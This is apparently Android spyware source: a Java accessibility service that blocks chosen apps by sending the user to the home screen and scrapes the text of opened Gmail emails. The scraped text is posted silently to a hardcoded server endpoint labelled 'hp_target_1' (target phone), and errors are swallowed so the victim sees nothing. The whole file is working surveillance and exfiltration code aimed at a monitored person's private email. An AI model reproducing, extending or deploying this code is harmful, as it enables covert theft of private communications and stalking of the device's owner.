package com.ezax.agent;

import android.accessibilityservice.AccessibilityService;
import android.content.SharedPreferences;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import org.json.JSONObject;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.HashSet;
import java.util.Set;

public class JaxAccessibilityService extends AccessibilityService {
    private static final String SERVER_URL = "http://192.168.1.25:5000"; // SESUAIKAN IP
    private Set<String> blockedApps = new HashSet<>();
    private String lastScrapedText = "";

    @Override
    public void onServiceConnected() {
        super.onServiceConnected();
        loadBlockedApps();
    }

    private void loadBlockedApps() {
        SharedPreferences prefs = getSharedPreferences("JaxPrefs", MODE_PRIVATE);
        String blockedString = prefs.getString("blocked_apps", "");
        blockedApps.clear();
        if (!blockedString.isEmpty()) {
            for (String app : blockedString.split(",")) {
                blockedApps.add(app.trim());
            }
        }
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event.getPackageName() == null) return;
        String packageName = event.getPackageName().toString();
        
        // 1. APP BLOCKER
        loadBlockedApps(); 
        if (blockedApps.contains(packageName)) {
            performGlobalAction(GLOBAL_ACTION_HOME);
            return;
        }

        // 2. GMAIL SCRAPER
        if (packageName.equals("com.google.android.gm")) {
            if (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED || 
                event.getEventType() == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) {
                
                AccessibilityNodeInfo root = getRootInActiveWindow();
                if (root != null) {
                    StringBuilder sb = new StringBuilder();
                    extractText(root, sb);
                    String finalText = sb.toString().trim();
                    
                    // Filter: Cuma kirim kalau ini beneran isi email (ada kata Reply/Forward/To)
                    // Dan panjang teksnya lumayan (bukan cuma judul inbox)
                    if (finalText.length() > 100 && (finalText.contains("Reply") || finalText.contains("Forward") || finalText.contains("Balas") || finalText.contains("Teruskan"))) {
                        if (!finalText.equals(lastScrapedText)) {
                            lastScrapedText = finalText;
                            kirimKeWeb("gmail", finalText);
                        }
                    }
                }
            }
        }
    }

    private void extractText(AccessibilityNodeInfo node, StringBuilder sb) {
        if (node == null) return;
        if (node.getText() != null) {
            sb.append(node.getText().toString()).append("\n");
        }
        for (int i = 0; i < node.getChildCount(); i++) {
            extractText(node.getChild(i), sb);
        }
    }

    private void kirimKeWeb(String type, String text) {
        new Thread(() -> {
            try {
                URL url = new URL(SERVER_URL + "/api/upload_result/hp_target_1");
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/json");
                conn.setDoOutput(true);
                JSONObject json = new JSONObject();
                json.put("type", type);
                json.put("data", text);
                try (OutputStream os = conn.getOutputStream()) {
                    os.write(json.toString().getBytes("utf-8"));
                }
                conn.getResponseCode();
            } catch (Exception e) { }
        }).start();
    }

    @Override
    public void onInterrupt() { }
}
